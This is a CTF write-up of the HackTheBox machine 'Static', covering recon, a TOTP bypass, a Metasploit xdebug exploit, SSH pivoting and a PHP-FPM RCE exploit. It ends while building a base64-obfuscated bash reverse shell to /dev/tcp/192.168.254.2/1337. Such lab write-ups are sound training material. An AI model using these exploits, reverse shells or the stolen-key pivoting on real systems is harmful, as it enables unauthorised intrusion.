---
title: "Walk-through of Static from HackTheBox"
header:
  teaser: /assets/images/2021-11-01-22-18-47.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - fixgz
  - xdebug
  - meterpreter
  - pspy64
---

## Machine Information

![static](/assets/images/2021-11-01-22-18-47.png)

Static is a hard machine on HackTheBox. We start with a hidden folder on a website containing a corrupt backup. Once recovered we're given a one time code to allow us to access another hidden section of the website, this time a support portal. From here we find a config file allowing us to connect to another network. We use meterpreter to gain a shell on a server on this new network, and the find a private key to give us SSH access. Enumeration finds more servers on this network, we tunnel through to one of them and use an exploit to enable remote code execution, eventually leading another reverse shell on this second box. There we exploit a poorly coded custom application and eventually get root.

<!--more-->

Skills required are extensive enumeration and research skills to find and exploit misconfigurations. Skills learnt are using native commands to enumerate and move files around. Using meterpreter, pspy64, port forwarding and more.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Hard - Static](https://www.hackthebox.eu/home/machines/profile/355) |
| Machine Release Date | 19th June 2021 |
| Date I Completed It | 10th November 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/static]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.246 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root💀kali)-[~/htb/static]
└─# nmap -p$ports -sC -sV -oA static 10.10.10.246
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 22:19 GMT
Nmap scan report for 10.10.10.246
Host is up (0.026s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```

Three open ports. We have OpenSSH on both 22 and 2222, they are also different versions which is interesting. We also have Apache on 8080, which is where we start:

![static-8080](/assets/images/2021-11-01-22-29-00.png)

We find nothing there. Looking back at nmap scan above we see there is a robots.txt file with two entries. We can confirm with curl:

```sh
┌──(root💀kali)-[~/htb/static]
└─# curl http://static.htb:8080/robots.txt 
User-agent: *
Disallow: /vpn/
Disallow: /.ftp_uploads/
```

## VPN Login Page

Back to the browser to try these. /vpn/ first:

![static-vpn](/assets/images/2021-11-01-22-31-11.png)

We have a login page. Trying obvious credentials works for admin:admin and we get to here:

![static-2fa](/assets/images/2021-11-01-22-32-21.png)

## FTP Backup Files

For now this appears to be a dead end as we have no intel to find a way past that screen. Let's try the other url:

![static-ftp](/assets/images/2021-11-01-22-33-41.png)

We have two files. A warning.txt and a gzip archive. We can read the txt file:

```sh
┌──(root💀kali)-[~/htb/static]
└─# curl http://static.htb:8080//.ftp_uploads/warning.txt
Binary files are being corrupted during transfer!!! Check if are recoverable.
```

A hint that the other file needs recovering before we can gunzip it. Let's grab it:

```sh
┌──(root💀kali)-[~/htb/static]
└─# wget http://static.htb:8080//.ftp_uploads/db.sql.gz   
--2021-11-01 22:36:55--  http://static.htb:8080//.ftp_uploads/db.sql.gz
Resolving static.htb (static.htb)... 10.10.10.246
Connecting to static.htb (static.htb)|10.10.10.246|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 262 [application/x-gzip]
Saving to: ‘db.sql.gz’
db.sql.gz           100%[==================>]     262  --.-KB/s    in 0s      
2021-11-01 22:36:55 (50.4 MB/s) - ‘db.sql.gz’ saved [262/262]
```

First check if we can gunzip or not:

```sh
┌──(root💀kali)-[~/htb/static]
└─# gunzip db.sql.gz
gzip: db.sql.gz: invalid compressed data--crc error
gzip: db.sql.gz: invalid compressed data--length error
```

Ok, they didn't lie then! A search for a tool to fix a corrupt gz file found [gzrecover](https://github.com/arenn/gzrt). Clone, make tool then recover file:

```sh
┌──(root💀kali)-[~/htb/static]
└─# git clone https://github.com/arenn/gzrt.git
Cloning into 'gzrt'...
remote: Enumerating objects: 24, done.
remote: Total 24 (delta 0), reused 0 (delta 0), pack-reused 24
Receiving objects: 100% (24/24), 15.49 KiB | 755.00 KiB/s, done.
Resolving deltas: 100% (10/10), done.

┌──(root💀kali)-[~/htb/static]
└─# cd gzrt                                              

┌──(root💀kali)-[~/htb/static/gzrt]
└─# make        
cc    -c -o gzrecover.o gzrecover.c
cc -Wall -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 gzrecover.c -lz -o gzrecover

┌──(root💀kali)-[~/htb/static/gzrt]
└─# ./gzrecover -v -o recovered ../db.sql.gz
Opened input file for reading: ../db.sql.gz
Opened output file for writing: recovered
Found error at byte 258 in input stream
Found good data at byte 0 in input stream
Total decompressed output = 363 bytes

┌──(root💀kali)-[~/htb/static/gzrt]
└─# file recovered                         
recovered: ASCII text

┌──(root💀kali)-[~/htb/static/gzrt]
└─# cat recovered                      
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsignint  a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS iaA; 
INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'IN
```

Either that didn't work, or the file needs more done to it than that. After a bit of head scratching I looked for another tool and found [this](https://github.com/yonjar/fixgz) one which worked:

```sh
┌──(root💀kali)-[~/htb/static]
└─# git clone https://github.com/yonjar/fixgz.git
Cloning into 'fixgz'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (10/10), 9.19 KiB | 9.19 MiB/s, done.
Resolving deltas: 100% (1/1), done.

┌──(root💀kali)-[~/htb/static]
└─# cd fixgz 

┌──(root💀kali)-[~/htb/static/fixgz]
└─# g++ fixgz.cpp -o fixgz

┌──(root💀kali)-[~/htb/static/fixgz]
└─# ./fixgz ../db.sql.gz fixed.gz

┌──(root💀kali)-[~/htb/static/fixgz]
└─# gunzip fixed.gz       

┌──(root💀kali)-[~/htb/static/fixgz]
└─# file fixed    
fixed: ASCII text

┌──(root💀kali)-[~/htb/static/fixgz]
└─# cat fixed    
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

Similar but much better! From this we see we have username of admin and hash of a password, which if it's the same as what we've already tried then that's admin as well. Out of curiosity let's crack it:

```sh
┌──(root💀kali)-[~/htb/static]
└─# echo "d033e22ae348aeb5660fc2140aec35850c4da997" > hash.txt 

┌──(root💀kali)-[~/htb/static]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)
1g 0:00:00:00 DONE (2021-11-01 22:59) 33.33g/s 660800p/s 660800c/s 660800C/s alcala..LOVE1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

Well, it was pretty obvious but good to practice our hash cracking skills.

## TOTP Plugin

Back to the gunzipped file and we see it says totp and gives us a code. What is TOTP? Time Based One Time Password, [here](https://www.hypr.com/time-based-time-password-totp-otp/) is a good explanation. I found [this](https://github.com/Authenticator-Extension/Authenticator) GitHub repo which linked to a FireFox plugin [here](https://addons.mozilla.org/en-US/firefox/addon/auth-helper/?src=external-github).

Once installed click on it's icon then on the pencil:

![static-totp](/assets/images/2021-11-01-23-09-45.png)

Add the totp code we've found above to the Secret field and click ok:

[static-secret](/assets/images/2021-11-02-21-44-12.png)

Now you have a rotating one time code:

![static-code](/assets/images/2021-11-02-21-45-06.png)

The next bit should be simple, as you just log in to the vpn page like before and enter your six digit code in the 2FA box. However this only works if your attack box time is the same as the static server. For me the time was 16 minutes different, you can check by using curl to get the remote server time:

```sh
──(root💀kali)-[~/htb/static]
└─# curl -i http://10.10.10.246:8080/vpn/login.php  
HTTP/1.1 200 OK
Date: Tue, 02 Nov 2021 21:50:04 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 202
Content-Type: text/html; charset=UTF-8
Connection: close
```

And then compare to local time:

```sh
┌──(root💀kali)-[~/htb/static]
└─# date
Tue Nov  2 09:34:51 PM GMT 2021
```

I just changed my local time to match the server:

```sh
┌──(root💀kali)-[~/htb/static]
└─# timedatectl set-time '21:50:00'
```

## IT Support Portal

Now back to the vpn page, paste the totp code in to the 2FA box and we end up here:

![static-support-portal](/assets/images/2021-11-02-21-57-06.png)

We are in a support portal with a list of servers. If we type one of their names in the Common Name box we can download a vpn connection file. First I download the web server:

![static-web](/assets/images/2021-11-02-22-01-43.png)

Trying to connect to it using the file doesn't work:

```sh
┌──(root💀kali)-[~/htb/static]
└─# openvpn web.ovpn   
2021-11-02 22:14:36 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
2021-11-02 22:14:36 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
2021-11-02 22:14:36 library versions: OpenSSL 1.1.1l  24 Aug 2021, LZO 2.10
2021-11-02 22:14:36 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2021-11-02 22:14:36 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
2021-11-02 22:14:36 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known)
2021-11-02 22:14:36 RESOLVE: Cannot resolve host address: vpn.static.htb:1194 (Name or service not known)
2021-11-02 22:14:36 Could not determine IPv4/IPv6 protocol
2021-11-02 22:14:36 NOTE: UID/GID downgrade will be delayed because of --client, --pull, or --up-delay
2021-11-02 22:14:36 SIGUSR1[soft,init_instance] received, process restarting
2021-11-02 22:14:36 Restart pause, 5 second(s)
```

Looking at the connection attempt above we see it's trying to get to vpn.static.htb, so let's add that to our hosts file:

```sh
sed -i '/10.10.10.246 static.htb/ s/$/ vpn.static.htb/' /etc/hosts
```

## Web Server

Now try again:

```sh
┌──(root💀kali)-[~/htb/static]
└─# openvpn web.ovpn                                                  
2021-11-02 22:21:35 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
2021-11-02 22:21:35 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
2021-11-02 22:21:35 library versions: OpenSSL 1.1.1l  24 Aug 2021, LZO 2.10
<SNIP>
2021-11-02 22:21:36 TUN/TAP device tun9 opened
2021-11-02 22:21:36 net_iface_mtu_set: mtu 1500 for tun9
2021-11-02 22:21:36 net_iface_up: set tun9 up
2021-11-02 22:21:36 net_addr_v4_add: 172.30.0.9/16 dev tun9
2021-11-02 22:21:36 net_route_v4_add: 172.17.0.0/24 via 172.30.0.1 dev [NULL] table 0 metric -1
2021-11-02 22:21:36 GID set to nogroup
2021-11-02 22:21:36 UID set to nobody
2021-11-02 22:21:36 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2021-11-02 22:21:36 Initialization Sequence Completed
```

We're connected and have a new tun interface to this network:

```sh
┌──(root💀kali)-[~/htb/static]
└─# ifconfig tun9
tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9
        inet6 fe80::7d9a:56a:6583:82ee  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Even though we're connected using the vpn file provided for the web server we can't actually connect to it, trying just hangs:

```sh
┌──(root💀kali)-[~/htb/static]
└─# curl http://172.20.0.10
```

This is because our tun9 IP is on a different subnet to the web server. We can add a new route to our interface to allow us to get to the different network. [This](https://www.cyberciti.biz/faq/ip-route-add-network-command-for-linux-explained/) is a good explanation of how to add routes. Let's do it now:

```sh
┌──(root💀kali)-[~/htb/static]
└─# ip route add 172.20.0.0/24 dev tun9
```

Now we can get to the web server:

```sh
┌──(root💀kali)-[~/htb/static]
└─# traceroute 172.20.0.10             
traceroute to 172.20.0.10 (172.20.0.10), 30 hops max, 60 byte packets
 1  172.30.0.1 (172.30.0.1)  25.670 ms  27.471 ms  28.446 ms
 2  172.20.0.10 (172.20.0.10)  28.349 ms  28.312 ms  28.214 ms
```

Before we carry on, I had a few issues where this VPN connection to the web server was unstable. I found to keep it reliable I had to reduce the MTU like this:

```sh
┌──(root💀kali)-[~]
└─# ifconfig tun9 mtu 1200

┌──(root💀kali)-[~/htb/static]
└─# ifconfig tun9
tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1200
        inet 172.30.0.10  netmask 255.255.0.0  destination 172.30.0.10
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 3  bytes 252 (252.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 348 (348.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

I recommend you do that, or risk wasting many hours scratching your head!

Moving on let's have a look in our browser:

![static-web-files](/assets/images/2021-11-02-22-19-57.png)

## XDebug

We find a php info file:

![static-phpinfo](/assets/images/2021-11-02-22-20-50.png)

Looking through the file we find the xdebug section towards the bottom:

![static-xdebug](/assets/images/2021-11-02-22-22-39.png)

## Meterpreter

This same exploit was seen in another box called [Olympus](https://www.hackthebox.com/home/machines/profile/135), we can use the same Metasploit method here. [This](https://www.acunetix.com/vulnerabilities/web/xdebug-remote-code-execution-via-xdebug-remote_connect_back/) article explains which settings need to be enabled for the exploit to work. When we check we can confirm they are set so let's fire up Meterpreter:

```sh
┌──(root💀kali)-[~/htb/static]
└─# msfdb start                       
[+] Starting database

┌──(root💀kali)-[~/htb/static]
└─# msfconsole 
       =[ metasploit v6.1.12-dev                          ]
+ -- --=[ 2176 exploits - 1152 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

msf6 > use exploit/unix/http/xdebug_unauth_exec
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/http/xdebug_unauth_exec) > set PATH /vpn/login.php
PATH => /vpn/login.php
msf6 exploit(unix/http/xdebug_unauth_exec) > set RHOSTS 172.20.0.10
RHOSTS => 172.20.0.10
msf6 exploit(unix/http/xdebug_unauth_exec) > set LHOST tun9
LHOST => tun9
msf6 exploit(unix/http/xdebug_unauth_exec) > set LPORT 9001
LPORT => 9001
msf6 exploit(unix/http/xdebug_unauth_exec) > exploit 

[*] Started reverse TCP handler on 172.30.0.10:9001 
[*] 172.20.0.10:80 - Waiting for client response.
[*] 172.20.0.10:80 - Receiving response
[*] 172.20.0.10:80 - Shell might take upto a minute to respond.Please be patient.
[*] 172.20.0.10:80 - Sending payload of size 2026 bytes
[*] Sending stage (39282 bytes) to 172.30.0.1
[*] Meterpreter session 1 opened (172.30.0.10:9001 -> 172.30.0.1:42084 ) at 2021-11-03 21:26:55 +0000
```

With the session connected we can drop to a shell to look around:

```sh
meterpreter > shell
Process 514 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

pwd
/var/www/html/vpn

ls -lsa /home
4 -rwxrwxrwx 1 root     root       33 Nov  3 13:38 user.txt
4 drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 www-data
```

## User Flag

Unusually the user flag is in the root of /home, let's grab it while we're here:

```text
cat /home/user.txt
<HIDDEN>
```

Looking in our users home folder we find something useful:

```sh
ls -lsa /home/www-data
0 lrwxrwxrwx 1 root     root        9 Jun 14 08:02 .bash_history -> /dev/null
4 drwx------ 2 www-data www-data 4096 Jun 14 08:00 .cache
4 drwx------ 2 www-data www-data 4096 Jun 14 07:54 .ssh

ls -lsa /home/www-data/.ssh
4 -rw-r--r-- 1 www-data www-data  390 Jun 14 07:54 authorized_keys
4 -rw------- 1 www-data www-data 1675 Jun 14 07:34 id_rsa
4 -rw-r--r-- 1 www-data www-data  390 Jun 14 07:34 id_rsa.pub

cat /home/www-data/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
<SNIP>
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----
```

Let's move from this Metasploit shell to a nice stable SSH conneciton. Copy the private key we've found and echo in to a file on Kali:

```text
┌──(root💀kali)-[~/htb/static]
└─# echo "-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
<SNIP>
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----" > id_rsa

┌──(root💀kali)-[~/htb/static]
└─# chmod 600 id_rsa
```

I tried using the SSH key to connect to the main static box:

```sh
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa_www-data www-data@10.10.10.246
www-data@10.10.10.246's password: 
Permission denied, please try again.
www-data@10.10.10.246's password: 
Permission denied, please try again.
www-data@10.10.10.246's password: 
www-data@10.10.10.246: Permission denied (publickey,password).
```

## User SSH Access

This didn't work but interestingly we can connect to the web server on it's 172 IP using www-data's SSH key:

```sh
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa www-data@172.20.0.10 
Last login: Wed Nov  3 21:38:58 2021 from 10.10.15.41
www-data@web:~$
```

And we can also use it to connect to the main Static box but on port 2222 which we saw from the initial scan was also running SSH:

```sh
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222
Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4
www-data@web:~$
```

To keep it simple I dropped out of the web VPN and carried on using SSH direct to the box for now. Nothing obvious jumped out until I looked at the network connections

```sh
www-data@web:/$ ifconfig eth1
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
        RX packets 392  bytes 361065 (361.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 498  bytes 36481 (36.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We have a second connection to a different network, with no nmap on the box I did a simple loop to scan the network:

```text
www-data@web:/$ for i in {1..254} ;do (ping -c 1 192.168.254.$i | grep "bytes from" &) ;done
64 bytes from 192.168.254.1: icmp_seq=1 ttl=64 time=0.097 ms
64 bytes from 192.168.254.2: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 192.168.254.3: icmp_seq=1 ttl=64 time=0.088 ms
```

We get a response from two IPs aswell as our own. Let's scan them for open ports using [this](https://coderwall.com/p/udnrjq/port-scanning-with-bash-without-sudo-nmap-or-nc) helpful bashfu:

```sh
www-data@web:/$ nmap2 () {
> [[ $# -ne 1 ]] && echo "Please provide server name" && return 1
> 
> for i in {1..9000} ; do
>   SERVER="$1"
>   PORT=$i
>   (echo  > /dev/tcp/$SERVER/$PORT) >& /dev/null &&
>    echo "Port $PORT seems to be open"
> done
> }

www-data@web:/$ nmap2 192.168.254.1
Port 22 seems to be open
Port 2222 seems to be open

www-data@web:/$ nmap2 192.168.254.2
Port 22 seems to be open
Port 80 seems to be open

www-data@web:/$ nmap2 192.168.254.3
Port 80 seems to be open
```

Looking back at IT Support Portal we found earlier I notice that 192.168.254.3 is listed on there as a server called pki. From the scan we can see port 80 is open, to get to that we'll need to tunnel a port from Kali through this SSH connection. We've done this many times before like on [GameZone](https://pencer.io/ctf/ctf-thm-game-zone), we simply forward port 80:

```sh
┌──(root💀kali)-[~/htb/static]
└─# ssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p2222 -i id_rsa
www-data@web:~$
```

## PKI Server

Here we have said any traffic on Kali to port 80 forward through the SSH connection to 10.10.10.246 on port 2222 and pass it on to 192.168.254.3 on port 80. There's a good article [here](https://www.ssh.com/academy/ssh/tunneling/example) that explains this some more.

Now we can access the pki server:

```sh
┌──(root💀kali)-[~/htb/static]
└─# curl -i localhost
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Nov 2021 22:27:24 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP-FPM/7.1

batch mode: /usr/bin/ersatool create|print|revoke CN
```

Ok, I admit I was expecting more! A search for PHP-FPM exploits reveals plenty of options on Github like [this](https://github.com/AleWong/PHP-FPM-Remote-Code-Execution-Vulnerability-CVE-2019-11043-) one, [this](https://github.com/neex/phuip-fpizdam) one or [this](https://github.com/theMiddleBlue/CVE-2019-11043) one. I went with the easiest, a simple Python script:

```sh
┌──(root💀kali)-[~/htb/static]
└─# wget https://raw.githubusercontent.com/theMiddleBlue/CVE-2019-11043/master/exploit.py
--2021-11-03 22:21:54--  https://raw.githubusercontent.com/theMiddleBlue/CVE-2019-11043/master/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4280 (4.2K) [text/plain]
Saving to: ‘exploit.py’
exploit.py      100%[======================================================================>]   4.18K  --.-KB/s    in 0s      
2021-11-03 22:21:55 (83.8 MB/s) - ‘exploit.py’ saved [4280/4280]
```

## RCE Exploit

We can run it against the server through our tunnel:

```sh
┌──(root💀kali)-[~/htb/static]
└─# python3 exploit.py --url http://localhost/index.php
[*] QSL candidate: 1754, 1759, 1764
[*] Target seems vulnerable (QSL:1754/HVL:224): PHPSESSID=d129421703528e986f0c21155dd4b765; path=/
[*] RCE successfully exploited!

    You should be able to run commands using:
    curl http://localhost/index.php?a=bin/ls+/
```

Looks good, let's try it:

```sh
┌──(root💀kali)-[~/htb/static]
└─# curl -s http://localhost/index.php?a=/usr/bin/id
[03-Nov-2021 22:41:23 UTC] PHP Warning:  Unknown: Unable to load dynamic library 'uid=33(www-data) gid=33(www-data) groups=33(www-data)
' - uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That works, so we have remote code execution to the server through our tunnel. What we can't do though is execute a reverse shell on the pki server and catch it back here on Kali. Instead we'll need to be on the web server in the middle, so we just have to copy a static binary of netcat across as it isn't on the box currently.

There's plenty of options on Github, I used [this](https://github.com/H74N/netcat-binaries/blob/master/nc) one:

```sh
┌──(root💀kali)-[~/htb/static]
└─# wget https://github.com/H74N/netcat-binaries/blob/master/nc?raw=true -O nc
--2021-11-05 16:54:06--  https://github.com/H74N/netcat-binaries/blob/master/nc?raw=true
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/H74N/netcat-binaries/raw/master/nc [following]
--2021-11-05 16:54:06--  https://github.com/H74N/netcat-binaries/raw/master/nc
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/H74N/netcat-binaries/master/nc [following]
--2021-11-05 16:54:06--  https://raw.githubusercontent.com/H74N/netcat-binaries/master/nc
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 779832 (762K) [application/octet-stream]
Saving to: ‘nc’
nc            100%[========================================>] 761.55K  3.34MB/s    in 0.2s    
2021-11-05 16:54:06 (3.34 MB/s) - ‘nc’ saved [779832/779832]
```

We also need to take curl over with us, I used [this](https://github.com/moparisthebest/static-curl) one:

```sh
┌──(root💀kali)-[~/htb/static]
└─# wget https://github.com/moparisthebest/static-curl/releases/download/v7.79.1/curl-amd64
--2021-11-06 17:06:33--  https://github.com/moparisthebest/static-curl/releases/download/v7.79.1/curl-amd64
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3451848 (3.3M) [application/octet-stream]
Saving to: ‘curl-amd64’
curl-amd64      100%[==========================================================>]   3.29M  19.5MB/s    in 0.2s    
2021-11-06 17:06:35 (19.5 MB/s) - ‘curl-amd64’ saved [3451848/3451848]
```

Now we need to copy them across to the web box:

```sh
┌──(root💀kali)-[~/htb/static]
└─# scp -P 2222 -i id_rsa nc  www-data@10.10.10.246:/tmp
nc                               100%  762KB   1.8MB/s   00:00
┌──(root💀kali)-[~/htb/static]
└─# scp -P 2222 -i id_rsa curl-amd64  www-data@10.10.10.246:/tmp
curl-amd64                       100% 3371KB   2.1MB/s   00:01
```

## Reverse Shell Payload

Finally we need to create our payload. We can take a pentestmonkey reverse shell from [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Them we base64 and URL encode it:

```text
┌──(root💀kali)-[~/htb/static]
└─# echo -n "/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.254.2/1337 0>&1'" | base64
L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn
```

Put that base64 encoded string in to echo, decode then pass to bash to be able to safely execute on the box. Also URL encode it, let's use Python to do that:

```text
┌──(root💀kali)-[~/htb/static]
└─# python3 -c "import urllib.parse; print(urllib.parse.quote('/bin/bash -c \'echo -n L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn | base64 -d | bash\''))" 
/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27
```

Now we have the payload to use with the a= parameter like before. So our final command looks like this:

```text
